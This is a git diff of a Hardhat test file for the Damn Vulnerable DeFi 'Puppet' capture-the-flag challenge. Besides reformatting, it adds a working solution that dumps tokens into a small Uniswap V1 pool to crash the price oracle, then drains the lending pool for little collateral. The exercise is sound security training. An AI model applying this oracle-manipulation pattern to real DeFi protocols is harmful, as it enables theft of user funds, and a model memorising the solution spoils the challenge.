@@ -1,44 +1,67 @@
 const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
 const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 
-const { ethers } = require('hardhat');
-const { expect } = require('chai');
+const { ethers } = require("hardhat");
+const { expect } = require("chai");
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
-function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
-    return tokensSold.mul(ethers.BigNumber.from('997')).mul(etherInReserve).div(
-        (tokensInReserve.mul(ethers.BigNumber.from('1000')).add(tokensSold.mul(ethers.BigNumber.from('997'))))
-    )
+function calculateTokenToEthInputPrice(
+    tokensSold,
+    tokensInReserve,
+    etherInReserve
+) {
+    return tokensSold
+        .mul(ethers.BigNumber.from("997"))
+        .mul(etherInReserve)
+        .div(
+            tokensInReserve
+                .mul(ethers.BigNumber.from("1000"))
+                .add(tokensSold.mul(ethers.BigNumber.from("997")))
+        );
 }
 
-describe('[Challenge] Puppet', function () {
+describe("[Challenge] Puppet", function () {
     let deployer, attacker;
 
     // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
-    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('10');
-    const UNISWAP_INITIAL_ETH_RESERVE = ethers.utils.parseEther('10');
+    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther("10");
+    const UNISWAP_INITIAL_ETH_RESERVE = ethers.utils.parseEther("10");
 
-    const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000');
-    const ATTACKER_INITIAL_ETH_BALANCE = ethers.utils.parseEther('25');
-    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('100000')
+    const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther("1000");
+    const ATTACKER_INITIAL_ETH_BALANCE = ethers.utils.parseEther("25");
+    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther("100000");
 
     before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, attacker] = await ethers.getSigners();
 
-        const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
-        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);
+        const UniswapExchangeFactory = new ethers.ContractFactory(
+            exchangeJson.abi,
+            exchangeJson.evm.bytecode,
+            deployer
+        );
+        const UniswapFactoryFactory = new ethers.ContractFactory(
+            factoryJson.abi,
+            factoryJson.evm.bytecode,
+            deployer
+        );
 
-        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
-        const PuppetPoolFactory = await ethers.getContractFactory('PuppetPool', deployer);
+        const DamnValuableTokenFactory = await ethers.getContractFactory(
+            "DamnValuableToken",
+            deployer
+        );
+        const PuppetPoolFactory = await ethers.getContractFactory(
+            "PuppetPool",
+            deployer
+        );
 
         await ethers.provider.send("hardhat_setBalance", [
             attacker.address,
             "0x15af1d78b58c40000", // 25 ETH
         ]);
-        expect(
-            await ethers.provider.getBalance(attacker.address)
-        ).to.equal(ATTACKER_INITIAL_ETH_BALANCE);
+        expect(await ethers.provider.getBalance(attacker.address)).to.equal(
+            ATTACKER_INITIAL_ETH_BALANCE
+        );
 
         // Deploy token to be traded in Uniswap
         this.token = await DamnValuableTokenFactory.deploy();
@@ -48,72 +71,148 @@ describe('[Challenge] Puppet', function () {
 
         // Deploy factory, initializing it with the address of the template exchange
         this.uniswapFactory = await UniswapFactoryFactory.deploy();
-        await this.uniswapFactory.initializeFactory(this.exchangeTemplate.address);
+        await this.uniswapFactory.initializeFactory(
+            this.exchangeTemplate.address
+        );
 
         // Create a new exchange for the token, and retrieve the deployed exchange's address
-        let tx = await this.uniswapFactory.createExchange(this.token.address, { gasLimit: 1e6 });
+        let tx = await this.uniswapFactory.createExchange(this.token.address, {
+            gasLimit: 1e6,
+        });
         const { events } = await tx.wait();
-        this.uniswapExchange = await UniswapExchangeFactory.attach(events[0].args.exchange);
+        this.uniswapExchange = await UniswapExchangeFactory.attach(
+            events[0].args.exchange
+        );
 
         // Deploy the lending pool
         this.lendingPool = await PuppetPoolFactory.deploy(
             this.token.address,
             this.uniswapExchange.address
         );
-    
+
         // Add initial token and ETH liquidity to the pool
         await this.token.approve(
             this.uniswapExchange.address,
             UNISWAP_INITIAL_TOKEN_RESERVE
         );
         await this.uniswapExchange.addLiquidity(
-            0,                                                          // min_liquidity
+            0, // min_liquidity
             UNISWAP_INITIAL_TOKEN_RESERVE,
-            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
+            (await ethers.provider.getBlock("latest")).timestamp * 2, // deadline
             { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
         );
-        
+
         // Ensure Uniswap exchange is working as expected
         expect(
             await this.uniswapExchange.getTokenToEthInputPrice(
-                ethers.utils.parseEther('1'),
+                ethers.utils.parseEther("1"),
                 { gasLimit: 1e6 }
             )
         ).to.be.eq(
             calculateTokenToEthInputPrice(
-                ethers.utils.parseEther('1'),
+                ethers.utils.parseEther("1"),
                 UNISWAP_INITIAL_TOKEN_RESERVE,
                 UNISWAP_INITIAL_ETH_RESERVE
             )
         );
-        
+
         // Setup initial token balances of pool and attacker account
-        await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
-        await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);
+        await this.token.transfer(
+            attacker.address,
+            ATTACKER_INITIAL_TOKEN_BALANCE
+        );
+        await this.token.transfer(
+            this.lendingPool.address,
+            POOL_INITIAL_TOKEN_BALANCE
+        );
 
         // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
         expect(
-            await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther('1'))
-        ).to.be.eq(ethers.utils.parseEther('2'));
+            await this.lendingPool.calculateDepositRequired(
+                ethers.utils.parseEther("1")
+            )
+        ).to.be.eq(ethers.utils.parseEther("2"));
 
         expect(
-            await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
-        ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE.mul('2'));
+            await this.lendingPool.calculateDepositRequired(
+                POOL_INITIAL_TOKEN_BALANCE
+            )
+        ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE.mul("2"));
     });
 
-    it('Exploit', async function () {
+    it("Exploit", async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // Attack liquidity
+        let attBalETH = await ethers.provider.getBalance(attacker.address);
+        let attBalDVT = await this.token.balanceOf(attacker.address);
+        console.log("Initial Balances:");
+        console.log(`Initial Eth: ${ethers.utils.formatEther(attBalETH)}`);
+        console.log(`Initial DVT: ${ethers.utils.formatEther(attBalDVT)}`);
+
+        // Approve and Attack
+        let tx = await this.token
+            .connect(attacker)
+            .approve(this.uniswapExchange.address, attBalDVT);
+        tx = await this.uniswapExchange
+            .connect(attacker)
+            .tokenToEthSwapInput(
+                attBalDVT.sub(1).toString(),
+                1,
+                (await ethers.provider.getBlock("latest")).timestamp * 2,
+                { gasLimit: 1e7 }
+            );
+
+        attBalETH = await ethers.provider.getBalance(attacker.address);
+        attBalDVT = await this.token.balanceOf(attacker.address);
+        console.log("Attacked Balances:");
+        console.log(`Current Eth: ${ethers.utils.formatEther(attBalETH)}`);
+        console.log(`Current DVT: ${ethers.utils.formatEther(attBalDVT)}`);
+
+        const price = await this.uniswapExchange
+            .connect(attacker)
+            .getTokenToEthInputPrice(ethers.utils.parseEther("1"), {
+                gasLimit: 1e6,
+            });
+
+        console.log(
+            `You would get ${ethers.utils.formatEther(
+                price
+            )} ETH for 1 DVT from the pool`
+        );
+
+        // Get pool deposit
+        const poolDVTBal = await this.token.balanceOf(this.lendingPool.address);
+        const lendCollat = await this.lendingPool
+            .connect(attacker)
+            .calculateDepositRequired(poolDVTBal);
+        console.log(
+            `You need ${ethers.utils.formatEther(
+                lendCollat
+            )} ETH to empty the lender`
+        );
+
+        // Empty the lender
+        tx = await this.lendingPool
+            .connect(attacker)
+            .borrow(poolDVTBal, { value: lendCollat.add(100) });
+
+        console.log("Attacked Successfully!");
+        attBalETH = await ethers.provider.getBalance(attacker.address);
+        attBalDVT = await this.token.balanceOf(attacker.address);
+        console.log("Attacked Balances:");
+        console.log(`After attack Eth: ${ethers.utils.formatEther(attBalETH)}`);
+        console.log(`After attack DVT: ${ethers.utils.formatEther(attBalDVT)}`);
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
 
-        // Attacker has taken all tokens from the pool        
-        expect(
-            await this.token.balanceOf(this.lendingPool.address)
-        ).to.be.eq('0');
-        expect(
-            await this.token.balanceOf(attacker.address)
-        ).to.be.gt(POOL_INITIAL_TOKEN_BALANCE);
+        // Attacker has taken all tokens from the pool
+        expect(await this.token.balanceOf(this.lendingPool.address)).to.be.eq(
+            "0"
+        );
+        expect(await this.token.balanceOf(attacker.address)).to.be.gt(
+            POOL_INITIAL_TOKEN_BALANCE
+        );
     });
 });
